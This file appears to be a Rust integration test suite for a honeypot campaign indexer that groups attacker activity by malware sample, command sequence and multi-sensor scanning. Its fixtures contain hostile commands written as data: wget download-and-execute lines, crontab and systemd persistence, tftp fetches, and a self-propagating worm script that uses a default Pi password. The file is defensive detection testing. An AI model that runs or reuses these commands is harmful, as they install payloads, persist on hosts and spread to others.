//! The campaign indexer against real Postgres: the three grouping rules on discriminating
//! fixtures, indicator provenance, download links resolved after the fetch, and the property that
//! indexing a ledger batch by batch, interleaved with appends, leaves exactly the state one pass
//! over the same ledger leaves.
//!
//! Each test gets a fresh database (`migrations = false`, then both migration sets), because the
//! indexer reads every ledger row past its cursor and a shared database holds other tests' rows.
//! Addresses are RFC 5737; keys and hashes are synthetic.

use std::collections::{BTreeMap, BTreeSet};
use std::net::IpAddr;
use std::path::PathBuf;

use chrono::{DateTime, Duration, TimeZone, Utc};
use core_scoring::{EventInput, Protocol, SignalType, append_event, append_telemetry_event};
use review::campaign::{self, BatchOutcome, SCANNER_MIN_SENSORS};
use sensor_framework::Uuid;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use sqlx::{PgPool, Row};

async fn migrate(pool: &PgPool) {
    sqlx::migrate!("../core-scoring/migrations")
        .run(pool)
        .await
        .unwrap();
    review::migrator().run(pool).await.unwrap();
}

fn t0() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 7, 4, 41, 0).unwrap()
}

fn sha_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

#[allow(clippy::too_many_arguments)]
async fn append(
    pool: &PgPool,
    ip: &str,
    sensor: &str,
    signal: SignalType,
    at: DateTime<Utc>,
    metadata: Value,
    session: Option<Uuid>,
) {
    let event = EventInput::from_signal(
        ip.parse::<IpAddr>().unwrap(),
        None,
        sensor.into(),
        signal,
        Protocol::Tcp,
        true,
        at,
        metadata,
        session,
    );
    if signal.is_telemetry() {
        append_telemetry_event(pool, event).await.unwrap();
    } else {
        append_event(pool, event).await.unwrap();
    }
}

async fn command(
    pool: &PgPool,
    ip: &str,
    sensor: &str,
    at: DateTime<Utc>,
    session: Uuid,
    cmd: &str,
) {
    append(
        pool,
        ip,
        sensor,
        SignalType::HoneypotCommandExec,
        at,
        json!({ "command": cmd }),
        Some(session),
    )
    .await;
}

async fn upload(pool: &PgPool, ip: &str, at: DateTime<Utc>, sha: &str, session: Option<Uuid>) {
    append(
        pool,
        ip,
        "ssh",
        SignalType::HoneypotMalwareUpload,
        at,
        json!({ "sample_sha256": sha, "sample_orig_name": "w.sh", "capture_reason": "exec_stdin" }),
        session,
    )
    .await;
}

async fn index_all(pool: &PgPool) {
    loop {
        match campaign::index_batch(pool, campaign::BATCH_EVENTS)
            .await
            .unwrap()
        {
            BatchOutcome::Indexed(0) => return,
            BatchOutcome::Indexed(_) => {}
            BatchOutcome::LockedOut => panic!("nothing else holds the campaign lock in a test"),
        }
    }
}

/// `(kind, key)` -> sorted member addresses.
async fn memberships(pool: &PgPool) -> BTreeMap<(String, String), Vec<String>> {
    let rows = sqlx::query(
        "SELECT c.kind, c.key, host(m.source_ip) AS ip FROM campaign c \
         JOIN campaign_member m ON m.campaign_id = c.id ORDER BY 1, 2, 3",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    let mut out: BTreeMap<(String, String), Vec<String>> = BTreeMap::new();
    for r in rows {
        out.entry((r.get("kind"), r.get("key")))
            .or_default()
            .push(r.get("ip"));
    }
    out
}

fn of_kind(m: &BTreeMap<(String, String), Vec<String>>, kind: &str) -> Vec<Vec<String>> {
    m.iter()
        .filter(|((k, _), _)| k == kind)
        .map(|(_, v)| v.clone())
        .collect()
}

/// The Raspberry Pi worm copies itself byte for byte: five infected hosts uploading the same body
/// are one campaign with five members, and a different body is another campaign.
#[sqlx::test(migrations = false)]
async fn a_worm_sample_from_five_hosts_is_one_campaign_with_five_members(pool: PgPool) {
    migrate(&pool).await;
    let worm = sha_hex(b"synthetic worm body");
    let other = sha_hex(b"an unrelated dropper");
    for i in 1..=5 {
        upload(
            &pool,
            &format!("192.0.2.{i}"),
            t0() + Duration::minutes(i),
            &worm,
            None,
        )
        .await;
    }
    // A host uploading twice is still one member.
    upload(&pool, "192.0.2.1", t0() + Duration::hours(2), &worm, None).await;
    upload(&pool, "198.51.100.9", t0(), &other, None).await;
    index_all(&pool).await;

    let m = memberships(&pool).await;
    let worm_members = m.get(&("sample".into(), worm.clone())).unwrap();
    assert_eq!(
        worm_members,
        &(1..=5).map(|i| format!("192.0.2.{i}")).collect::<Vec<_>>()
    );
    assert_eq!(m.get(&("sample".into(), other)).unwrap().len(), 1);

    let row = sqlx::query(
        "SELECT member_count, sightings, first_seen, last_seen, label FROM campaign \
         WHERE kind = 'sample' AND key = $1",
    )
    .bind(&worm)
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(row.get::<i32, _>("member_count"), 5);
    assert_eq!(row.get::<i64, _>("sightings"), 6);
    assert_eq!(
        row.get::<DateTime<Utc>, _>("first_seen"),
        t0() + Duration::minutes(1)
    );
    assert_eq!(
        row.get::<DateTime<Utc>, _>("last_seen"),
        t0() + Duration::hours(2)
    );
    assert_eq!(
        row.get::<String, _>("label"),
        format!("sample {} (w.sh)", &worm[..12])
    );
    let uploaded: Vec<bool> = sqlx::query_scalar(
        "SELECT uploaded FROM campaign_member m JOIN campaign c ON c.id = m.campaign_id \
         WHERE c.key = $1",
    )
    .bind(&worm)
    .fetch_all(&pool)
    .await
    .unwrap();
    assert!(uploaded.iter().all(|u| *u));
}

/// The owner's w.sh campaign: the same eleven-command script from many addresses, varying only in
/// the addresses and random markers it carries, is one command-sequence campaign. A session running
/// other commands is another, and a bare shell-entry preamble joins nothing.
#[sqlx::test(migrations = false)]
async fn sessions_differing_only_in_markers_and_addresses_group_and_others_do_not(pool: PgPool) {
    migrate(&pool).await;
    let script = |ip: &str, marker: &str| -> Vec<String> {
        vec![
            "uname -s -v -n -r -m".to_string(),
            format!("echo {marker} > /tmp/.w && cat /tmp/.w && rm -f /tmp/.w"),
            "nproc".to_string(),
            "cat > w.sh".to_string(),
            format!("(crontab -l; echo \"@reboot /tmp/w.sh {ip}:443\") | crontab -"),
            "mkdir -p ~/.config/systemd/user".to_string(),
            "cat > ~/.config/systemd/user/watcher-netai.service".to_string(),
            "systemctl --user enable watcher-netai.service".to_string(),
            "ps aux | grep astats | grep -v grep | wc -l".to_string(),
            "cat > astats".to_string(),
            "cat > astats".to_string(),
            "cat > astats".to_string(),
        ]
    };
    let campaign_ips = ["192.0.2.21", "192.0.2.22", "198.51.100.23"];
    let markers = [
        "3f2a9c1e5b7d4a60c1e2f3a4b5c6d7e8",
        "ffffeeee0000111122223333444455556666",
        "0123456789abcdef0123456789abcdef",
    ];
    for (n, (ip, marker)) in campaign_ips.iter().zip(markers).enumerate() {
        let session = Uuid::now_v7();
        let start = t0() + Duration::minutes(20 * n as i64);
        for (i, c) in script(&format!("203.0.113.{}", 50 + n), marker)
            .iter()
            .enumerate()
        {
            command(
                &pool,
                ip,
                "ssh",
                start + Duration::seconds(2 * i as i64),
                session,
                c,
            )
            .await;
        }
    }
    let survey = Uuid::now_v7();
    for (i, c) in ["pwd", "ssh -V", "uptime", "mount", "env", "ls -la /"]
        .iter()
        .enumerate()
    {
        command(
            &pool,
            "192.0.2.30",
            "ssh",
            t0() + Duration::seconds(i as i64),
            survey,
            c,
        )
        .await;
    }
    let preamble = Uuid::now_v7();
    for (i, c) in ["enable", "system", "shell", "sh"].iter().enumerate() {
        command(
            &pool,
            "192.0.2.31",
            "telnet",
            t0() + Duration::seconds(i as i64),
            preamble,
            c,
        )
        .await;
    }
    // Later traffic on both sensors moves their clocks past every session's idle gap.
    let later = t0() + Duration::hours(3);
    command(&pool, "192.0.2.99", "ssh", later, Uuid::now_v7(), "id").await;
    command(&pool, "192.0.2.99", "telnet", later, Uuid::now_v7(), "id").await;
    index_all(&pool).await;

    let sequences = of_kind(&memberships(&pool).await, "command_sequence");
    assert_eq!(sequences.len(), 2, "{sequences:?}");
    assert!(
        sequences.contains(&vec![
            "192.0.2.21".to_string(),
            "192.0.2.22".to_string(),
            "198.51.100.23".to_string()
        ]),
        "{sequences:?}"
    );
    assert!(sequences.contains(&vec!["192.0.2.30".to_string()]));

    let (label, rep): (String, Value) = sqlx::query_as(
        "SELECT label, representative FROM campaign WHERE kind = 'command_sequence' \
         AND member_count = 3",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(
        label.starts_with("10 commands: uname -s -v -n -r -m ; echo <hex>"),
        "{label}"
    );
    assert_eq!(
        rep["source_ip"], "192.0.2.21",
        "the earliest run represents the campaign"
    );
    assert_eq!(rep["shapes"].as_array().unwrap().len(), 10);
}

/// An open run is not grouped until its sensor's clock passes the idle gap; one that reaches the
/// shape cap is grouped at once.
#[sqlx::test(migrations = false)]
async fn a_run_is_grouped_at_the_idle_gap_or_the_shape_cap(pool: PgPool) {
    migrate(&pool).await;
    let short = Uuid::now_v7();
    for (i, c) in ["cat /proc/cpuinfo", "free -m", "uname -a"]
        .iter()
        .enumerate()
    {
        command(
            &pool,
            "192.0.2.40",
            "ssh",
            t0() + Duration::seconds(i as i64),
            short,
            c,
        )
        .await;
    }
    let long = Uuid::now_v7();
    for i in 0..campaign::MAX_RUN_SHAPES {
        command(
            &pool,
            "192.0.2.41",
            "ssh",
            t0() + Duration::seconds(i.into()),
            long,
            &format!("echo step{i}"),
        )
        .await;
    }
    index_all(&pool).await;
    let sequences = of_kind(&memberships(&pool).await, "command_sequence");
    assert_eq!(sequences, vec![vec!["192.0.2.41".to_string()]]);

    // The quiet run is ended once ssh has logged events an hour newer than its last command, not
    // before.
    command(
        &pool,
        "192.0.2.99",
        "ssh",
        t0() + Duration::minutes(59),
        Uuid::now_v7(),
        "id",
    )
    .await;
    index_all(&pool).await;
    assert_eq!(
        of_kind(&memberships(&pool).await, "command_sequence").len(),
        1
    );
    command(
        &pool,
        "192.0.2.99",
        "ssh",
        t0() + Duration::minutes(61),
        Uuid::now_v7(),
        "id",
    )
    .await;
    index_all(&pool).await;
    assert_eq!(
        of_kind(&memberships(&pool).await, "command_sequence").len(),
        2
    );

    // A gap of more than ten minutes between two of a session's own commands ends its run: the
    // next command starts a new one rather than extending the old.
    let paused = Uuid::now_v7();
    let base = t0() + Duration::hours(2);
    command(
        &pool,
        "192.0.2.42",
        "ssh",
        base,
        paused,
        "cat /proc/cpuinfo; free -m",
    )
    .await;
    command(
        &pool,
        "192.0.2.42",
        "ssh",
        base + Duration::minutes(9),
        paused,
        "uname -a",
    )
    .await;
    command(
        &pool,
        "192.0.2.42",
        "ssh",
        base + Duration::minutes(20),
        paused,
        "uname -a",
    )
    .await;
    index_all(&pool).await;
    let (run, shapes): (i32, i32) =
        sqlx::query_as("SELECT run, shapes FROM campaign_session WHERE session_id = $1")
            .bind(paused)
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!((run, shapes), (1, 1));
    let members = of_kind(&memberships(&pool).await, "command_sequence");
    assert!(
        members.contains(&vec!["192.0.2.42".to_string()]),
        "{members:?}"
    );
}

#[sqlx::test(migrations = false)]
async fn a_source_on_enough_sensors_within_a_window_is_a_scanner(pool: PgPool) {
    migrate(&pool).await;
    let sensors = ["catchall", "mssql", "adb", "http"];
    assert!(sensors.len() > SCANNER_MIN_SENSORS);
    for (i, s) in sensors.iter().enumerate() {
        let at = t0() + Duration::minutes(i as i64);
        append(
            &pool,
            "192.0.2.50",
            s,
            SignalType::CatchallProbe,
            at,
            json!({}),
            None,
        )
        .await;
        append(
            &pool,
            "192.0.2.51",
            s,
            SignalType::CatchallProbe,
            at,
            json!({}),
            None,
        )
        .await;
        // The same sensors, one per hour: never three within one window.
        append(
            &pool,
            "192.0.2.52",
            s,
            SignalType::CatchallProbe,
            t0() + Duration::hours(i as i64),
            json!({}),
            None,
        )
        .await;
    }
    // Telemetry is not activity: session-end records on new sensors cross nothing.
    for s in ["ftp", "smtp", "redis"] {
        append(
            &pool,
            "192.0.2.53",
            s,
            SignalType::HoneypotSessionEnd,
            t0(),
            json!({}),
            None,
        )
        .await;
    }
    index_all(&pool).await;
    let m = memberships(&pool).await;
    let scanners: Vec<(&(String, String), &Vec<String>)> =
        m.iter().filter(|((k, _), _)| k == "scanner").collect();
    assert_eq!(scanners.len(), 1, "{m:?}");
    let ((_, key), members) = scanners[0];
    assert_eq!(key, "adb,catchall,mssql");
    assert_eq!(
        members,
        &vec!["192.0.2.50".to_string(), "192.0.2.51".to_string()]
    );
}

/// Indicators from commands carry the event they came from; indicators from a captured artifact
/// carry its digest, and a worm-shaped artifact marks its sample campaign self-propagating.
#[sqlx::test(migrations = false)]
async fn indicators_carry_their_provenance(pool: PgPool) {
    migrate(&pool).await;
    let spool = tempfile::tempdir().unwrap();
    let worm = "#!/bin/bash\n\
                echo \"127.0.0.1 rival.example.net\" >> /etc/hosts\n\
                zmap -p 22 -o list\n\
                sshpass -praspberry scp $0 pi@$ip:/tmp/x\n";
    let worm_sha = sha_hex(worm.as_bytes());
    std::fs::write(spool.path().join(&worm_sha), worm).unwrap();
    let binary_sha = sha_hex(b"\x7fELF\x02\x01\x01\0binary");
    std::fs::write(
        spool.path().join(&binary_sha),
        b"\x7fELF\x02\x01\x01\0binary",
    )
    .unwrap();
    let missing_sha = sha_hex(b"never spooled");

    let session = Uuid::now_v7();
    command(
        &pool,
        "192.0.2.60",
        "ssh",
        t0(),
        session,
        "cd /tmp; wget http://198.51.100.70:8080/kswpad",
    )
    .await;
    command(
        &pool,
        "192.0.2.60",
        "ssh",
        t0() + Duration::seconds(5),
        session,
        "wget http://198.51.100.70:8080/kswpad",
    )
    .await;
    for (i, sha) in [&worm_sha, &binary_sha, &missing_sha].iter().enumerate() {
        upload(&pool, &format!("192.0.2.{}", 61 + i), t0(), sha, None).await;
    }
    index_all(&pool).await;
    let dirs: Vec<(&'static str, PathBuf)> = vec![("ssh", spool.path().to_path_buf())];
    let scanned = campaign::scan_artifacts(&pool, &dirs).await.unwrap();
    assert_eq!(
        scanned, 2,
        "the text and the binary body were found; the third was not"
    );

    let rows = sqlx::query(
        "SELECT kind, value, detail, event_id, host(source_ip) AS ip, sightings FROM ioc \
         WHERE artifact_sha256 IS NULL",
    )
    .fetch_all(&pool)
    .await
    .unwrap();
    assert_eq!(rows.len(), 1);
    assert_eq!(
        rows[0].get::<String, _>("value"),
        "http://198.51.100.70:8080/kswpad"
    );
    assert_eq!(rows[0].get::<String, _>("ip"), "192.0.2.60");
    assert_eq!(rows[0].get::<i64, _>("sightings"), 2);
    let first_event: i64 = sqlx::query_scalar("SELECT min(id) FROM event")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(rows[0].get::<i64, _>("event_id"), first_event);

    let artifact: Vec<(String, String)> =
        sqlx::query_as("SELECT kind, value FROM ioc WHERE artifact_sha256 = $1 ORDER BY kind")
            .bind(&worm_sha)
            .fetch_all(&pool)
            .await
            .unwrap();
    assert_eq!(
        artifact,
        vec![(
            "hosts_entry".to_string(),
            "127.0.0.1 rival.example.net".to_string()
        )]
    );
    let states: BTreeMap<String, (String, i32)> = sqlx::query_as::<_, (String, String, i32)>(
        "SELECT sha256, state, attempts FROM ioc_artifact_scan",
    )
    .fetch_all(&pool)
    .await
    .unwrap()
    .into_iter()
    .map(|(s, st, a)| (s, (st, a)))
    .collect();
    assert_eq!(states[&worm_sha].0, "done");
    assert_eq!(states[&binary_sha].0, "not_text");
    assert_eq!(
        states[&missing_sha],
        ("pending".to_string(), 1),
        "a miss is retried later"
    );
    let propagating: bool = sqlx::query_scalar(
        "SELECT self_propagating FROM campaign WHERE kind = 'sample' AND key = $1",
    )
    .bind(&worm_sha)
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(propagating);
}

/// A download reported before the fetcher has an outcome is linked to the sample once it does.
#[sqlx::test(migrations = false)]
async fn a_download_joins_the_sample_campaign_once_the_fetch_lands(pool: PgPool) {
    migrate(&pool).await;
    let url = "http://198.51.100.80/bins/x86";
    for ip in ["192.0.2.71", "192.0.2.72"] {
        append(
            &pool,
            ip,
            "telnet",
            SignalType::HoneypotFileDownload,
            t0(),
            json!({ "url": url }),
            None,
        )
        .await;
    }
    index_all(&pool).await;
    assert!(of_kind(&memberships(&pool).await, "sample").is_empty());
    let pending: i64 = sqlx::query_scalar("SELECT count(*) FROM campaign_pending_fetch")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(pending, 2);

    let body_sha = Sha256::digest(b"fetched loader").to_vec();
    sqlx::query(
        "INSERT INTO fetch_attempt (url_hash, url, host, scheme, status, sha256, last_attempt) \
         VALUES ($1, $2, '198.51.100.80', 'http', 'success', $3, now())",
    )
    .bind(Sha256::digest(url.as_bytes()).to_vec())
    .bind(url)
    .bind(&body_sha)
    .execute(&pool)
    .await
    .unwrap();
    assert_eq!(campaign::resolve_pending_fetches(&pool).await.unwrap(), 2);
    let key: String = body_sha.iter().map(|b| format!("{b:02x}")).collect();
    let m = memberships(&pool).await;
    assert_eq!(
        m.get(&("sample".into(), key)).unwrap(),
        &vec!["192.0.2.71".to_string(), "192.0.2.72".to_string()]
    );
    // A later download of the same URL links at once.
    append(
        &pool,
        "192.0.2.73",
        "telnet",
        SignalType::HoneypotFileDownload,
        t0(),
        json!({ "url": url }),
        None,
    )
    .await;
    index_all(&pool).await;
    assert_eq!(of_kind(&memberships(&pool).await, "sample")[0].len(), 3);
}

// ---- incremental versus one pass ----

/// xorshift64*: a deterministic generator, so every case is reproducible from its seed.
struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }
    fn below(&mut self, n: u64) -> u64 {
        self.next() % n
    }
    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.below(items.len() as u64) as usize]
    }
}

const IPS: [&str; 6] = [
    "192.0.2.1",
    "192.0.2.2",
    "198.51.100.3",
    "198.51.100.4",
    "203.0.113.5",
    "2001:db8::6",
];
const SENSORS: [&str; 4] = ["ssh", "telnet", "adb", "http"];
const SHAS: [&str; 3] = [
    "1111111111111111111111111111111111111111111111111111111111111111",
    "2222222222222222222222222222222222222222222222222222222222222222",
    "3333333333333333333333333333333333333333333333333333333333333333",
];

fn generated_command(rng: &mut Rng) -> String {
    let host = format!("203.0.113.{}", rng.below(250));
    match rng.below(10) {
        0 => "enable".into(),
        1 => "sh".into(),
        2 => format!(
            "/bin/busybox echo -ne '\\x{:02x}\\x{:02x}' >> .i",
            rng.below(256),
            rng.below(256)
        ),
        3 => format!(
            "wget http://{host}/i; chmod 777 i; ./i {host}:{}",
            rng.below(65535)
        ),
        4 => "uname -s -v -n -r -m".into(),
        5 => format!("echo {:032x} > /tmp/.m", rng.next()),
        6 => "cat > astats".into(),
        7 => format!(
            "(crontab -l; echo \"@reboot /tmp/w.sh\") | crontab -; echo {}",
            rng.below(3)
        ),
        8 => "ps aux | grep astats | grep -v grep | wc -l".into(),
        _ => format!("tftp -g -r x{} {host}", rng.below(3)),
    }
}

/// Appends one generated event and returns nothing; sessions are kept by the caller.
async fn generated_event(
    pool: &PgPool,
    rng: &mut Rng,
    at: DateTime<Utc>,
    sessions: &mut Vec<(Uuid, &'static str, &'static str)>,
) {
    let roll = rng.below(100);
    if roll < 55 {
        if sessions.is_empty() || rng.below(5) == 0 {
            sessions.push((
                Uuid::now_v7(),
                *rng.pick(&IPS),
                *rng.pick(&["ssh", "telnet"]),
            ));
        }
        let (session, ip, sensor) = *rng.pick(sessions);
        let metadata = match rng.below(20) {
            0 => json!({ "command": "<summary>", "command_summary": true }),
            1 => json!({ "command": "<binary channel data>", "flood": "binary" }),
            _ => json!({ "command": generated_command(rng) }),
        };
        append(
            pool,
            ip,
            sensor,
            SignalType::HoneypotCommandExec,
            at,
            metadata,
            Some(session),
        )
        .await;
    } else if roll < 65 {
        let session = (!sessions.is_empty() && rng.below(2) == 0).then(|| rng.pick(sessions).0);
        let ip = session
            .and_then(|s| sessions.iter().find(|x| x.0 == s).map(|x| x.1))
            .unwrap_or_else(|| *rng.pick(&IPS));
        upload(pool, ip, at, rng.pick(&SHAS), session).await;
    } else if roll < 72 {
        let url = format!("http://198.51.100.{}/bins/x{}", rng.below(3), rng.below(2));
        append(
            pool,
            rng.pick(&IPS),
            "telnet",
            SignalType::HoneypotFileDownload,
            at,
            json!({ "url": url }),
            None,
        )
        .await;
    } else if roll < 95 {
        append(
            pool,
            rng.pick(&IPS),
            rng.pick(&SENSORS),
            SignalType::CatchallProbe,
            at,
            json!({}),
            None,
        )
        .await;
    } else {
        append(
            pool,
            rng.pick(&IPS),
            rng.pick(&SENSORS),
            SignalType::HoneypotSessionEnd,
            at,
            json!({}),
            None,
        )
        .await;
    }
}

/// Every derived table, keyed by what identifies a row rather than by surrogate ids, as sorted text.
async fn snapshot(pool: &PgPool) -> BTreeMap<&'static str, Vec<String>> {
    let queries: [(&str, &str); 11] = [
        (
            "campaign",
            "SELECT concat_ws('|', kind, key, label, representative::text, rep_event_id, \
                first_seen, last_seen, member_count, sightings, self_propagating) FROM campaign",
        ),
        (
            "member",
            "SELECT concat_ws('|', c.kind, c.key, host(m.source_ip), m.first_seen, \
                m.last_seen, m.sightings, m.uploaded) FROM campaign_member m \
                JOIN campaign c ON c.id = m.campaign_id",
        ),
        (
            "member_day",
            "SELECT concat_ws('|', c.kind, c.key, d.day, host(d.source_ip)) \
                FROM campaign_member_day d JOIN campaign c ON c.id = d.campaign_id",
        ),
        (
            "sensor",
            "SELECT concat_ws('|', c.kind, c.key, s.sensor, s.sightings) \
                FROM campaign_sensor s JOIN campaign c ON c.id = s.campaign_id",
        ),
        (
            "sample",
            "SELECT concat_ws('|', c.kind, c.key, s.sha256) \
                FROM campaign_sample s JOIN campaign c ON c.id = s.campaign_id",
        ),
        (
            "session",
            "SELECT concat_ws('|', session_id, host(source_ip), sensor, run, first_seen, \
                last_seen, first_event_id, last_event_id, shapes, shape_chars, encode(last_shape, 'hex'), \
                encode(chain, 'hex'), campaign_key, closed, pending_samples::text) FROM campaign_session",
        ),
        (
            "watermark",
            "SELECT concat_ws('|', sensor, observed) FROM campaign_watermark",
        ),
        (
            "window",
            "SELECT concat_ws('|', host(source_ip), window_start, sensors::text, crossed) \
                FROM campaign_scan_window",
        ),
        (
            "pending",
            "SELECT concat_ws('|', encode(url_hash, 'hex'), host(source_ip), sensor, event_id, \
                first_seen, last_seen, sightings) FROM campaign_pending_fetch",
        ),
        (
            "ioc",
            "SELECT concat_ws('|', kind, value, detail, artifact_sha256, event_id, host(source_ip), \
                first_seen, last_seen, sightings) FROM ioc",
        ),
        (
            "scan",
            "SELECT concat_ws('|', sha256, state) FROM ioc_artifact_scan",
        ),
    ];
    let mut out = BTreeMap::new();
    for (name, sql) in queries {
        let mut rows: Vec<String> = sqlx::query_scalar(sqlx::AssertSqlSafe(sql.to_string()))
            .fetch_all(pool)
            .await
            .unwrap();
        rows.sort();
        out.insert(name, rows);
    }
    out
}

async fn reset_index(pool: &PgPool) {
    sqlx::query(
        "TRUNCATE campaign, campaign_member, campaign_member_day, campaign_sensor, campaign_sample, \
                  campaign_session, campaign_watermark, campaign_scan_window, campaign_pending_fetch, \
                  ioc, ioc_artifact_scan RESTART IDENTITY",
    )
    .execute(pool)
    .await
    .unwrap();
    sqlx::query("UPDATE campaign_cursor SET last_event_id = 0")
        .execute(pool)
        .await
        .unwrap();
}

/// The sample and scanner memberships recomputed from the ledger by a different method: a SQL
/// aggregate over the uploads, and a walk over the events in id order for the scanner windows.
async fn ledger_oracle(pool: &PgPool) -> (BTreeSet<(String, String)>, BTreeSet<(String, String)>) {
    let samples: Vec<(String, String)> = sqlx::query_as(
        "SELECT DISTINCT metadata->>'sample_sha256', host(source_ip) FROM event \
         WHERE signal_type = 'honeypot_malware_upload'",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    let rows: Vec<(String, String, DateTime<Utc>, String)> = sqlx::query_as(
        "SELECT host(source_ip), sensor, observed_at, signal_type::text FROM event ORDER BY id",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    let mut windows: BTreeMap<(String, i64), BTreeSet<String>> = BTreeMap::new();
    let mut scanners = BTreeSet::new();
    for (ip, sensor, at, signal) in rows {
        if signal == "honeypot_session_end" {
            continue;
        }
        let set = windows
            .entry((
                ip.clone(),
                at.timestamp().div_euclid(campaign::SCANNER_WINDOW_SECS),
            ))
            .or_default();
        if set.len() >= SCANNER_MIN_SENSORS {
            continue;
        }
        set.insert(sensor);
        if set.len() == SCANNER_MIN_SENSORS {
            scanners.insert((set.iter().cloned().collect::<Vec<_>>().join(","), ip));
        }
    }
    (samples.into_iter().collect(), scanners)
}

#[sqlx::test(migrations = false)]
async fn incremental_indexing_equals_one_pass_over_the_same_ledger(pool: PgPool) {
    migrate(&pool).await;
    let mut kinds_seen = BTreeSet::new();
    let mut runs_ended_by_gap = false;
    for seed in 1..=12u64 {
        reset_index(&pool).await;
        let mut rng = Rng(seed.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1);
        let mut sessions = Vec::new();
        let mut at = t0() + Duration::days(seed as i64);
        for _ in 0..90 {
            // Mostly seconds apart, sometimes past the idle gap or the scanner window.
            at += match rng.below(12) {
                0 => Duration::seconds(700 + rng.below(4000) as i64),
                _ => Duration::seconds(rng.below(90) as i64),
            };
            generated_event(&pool, &mut rng, at, &mut sessions).await;
            if rng.below(6) == 0 {
                campaign::index_batch(&pool, 1 + rng.below(25) as i64)
                    .await
                    .unwrap();
            }
        }
        while campaign::index_batch(&pool, 1 + rng.below(25) as i64)
            .await
            .unwrap()
            != BatchOutcome::Indexed(0)
        {}
        let incremental = snapshot(&pool).await;

        let (samples, scanners) = ledger_oracle(&pool).await;
        let members = memberships(&pool).await;
        let uploaded: BTreeSet<(String, String)> = sqlx::query_as(
            "SELECT c.key, host(m.source_ip) FROM campaign_member m \
             JOIN campaign c ON c.id = m.campaign_id WHERE c.kind = 'sample' AND m.uploaded",
        )
        .fetch_all(&pool)
        .await
        .unwrap()
        .into_iter()
        .collect();
        assert_eq!(
            uploaded, samples,
            "seed {seed}: sample members against the ledger"
        );
        let scanner_members: BTreeSet<(String, String)> = members
            .iter()
            .filter(|((k, _), _)| k == "scanner")
            .flat_map(|((_, key), ips)| ips.iter().map(move |ip| (key.clone(), ip.clone())))
            .collect();
        assert_eq!(
            scanner_members, scanners,
            "seed {seed}: scanner members against the ledger"
        );
        let miscounted: i64 = sqlx::query_scalar(
            "SELECT count(*) FROM campaign c WHERE member_count <> \
             (SELECT count(*) FROM campaign_member m WHERE m.campaign_id = c.id)",
        )
        .fetch_one(&pool)
        .await
        .unwrap();
        assert_eq!(
            miscounted, 0,
            "seed {seed}: member_count against the member rows"
        );

        reset_index(&pool).await;
        let ledger: i64 = sqlx::query_scalar("SELECT count(*) FROM event")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(
            campaign::index_batch(&pool, 1_000_000).await.unwrap(),
            BatchOutcome::Indexed(ledger as usize)
        );
        let one_pass = snapshot(&pool).await;
        for (table, rows) in &incremental {
            assert_eq!(rows, &one_pass[table], "seed {seed}: table {table} differs");
        }
        assert!(
            !incremental["campaign"].is_empty() && !incremental["session"].is_empty(),
            "seed {seed}: the generator produced nothing to compare"
        );
        for row in &incremental["campaign"] {
            kinds_seen.insert(row.split('|').next().unwrap_or_default().to_string());
        }
        runs_ended_by_gap |= incremental["session"]
            .iter()
            .any(|r| r.split('|').nth(3).is_some_and(|run| run != "0"));
    }
    // The cases exercised every rule, and runs ended mid-session, not only at the final sweep.
    assert_eq!(
        kinds_seen,
        ["command_sequence", "sample", "scanner"]
            .into_iter()
            .map(String::from)
            .collect::<BTreeSet<_>>()
    );
    assert!(runs_ended_by_gap);
}

#[sqlx::test(migrations = false)]
async fn a_second_indexer_is_locked_out_while_one_holds_the_lock(pool: PgPool) {
    migrate(&pool).await;
    upload(&pool, "192.0.2.90", t0(), SHAS[0], None).await;
    let mut holder = pool.begin().await.unwrap();
    let held: bool = sqlx::query_scalar("SELECT pg_try_advisory_xact_lock(7265646772697400015)")
        .fetch_one(&mut *holder)
        .await
        .unwrap();
    assert!(held);
    assert_eq!(
        campaign::index_batch(&pool, 10).await.unwrap(),
        BatchOutcome::LockedOut
    );
    holder.rollback().await.unwrap();
    assert_eq!(
        campaign::index_batch(&pool, 10).await.unwrap(),
        BatchOutcome::Indexed(1)
    );
}
